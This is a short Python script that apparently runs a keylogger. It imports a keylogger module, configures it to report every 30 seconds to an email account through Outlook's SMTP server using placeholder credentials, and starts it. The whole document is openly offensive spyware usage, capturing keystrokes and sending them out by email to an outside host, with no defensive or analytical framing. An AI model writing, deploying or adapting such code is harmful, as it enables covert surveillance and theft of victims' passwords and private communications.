import keylogger

my_keylogger = keylogger.Keylogger(time_interval= 30, email= "your-email@hotmail.com", password= "yourPassword", server= "smtp-mail.outlook.com", port=587)
my_keylogger.start()

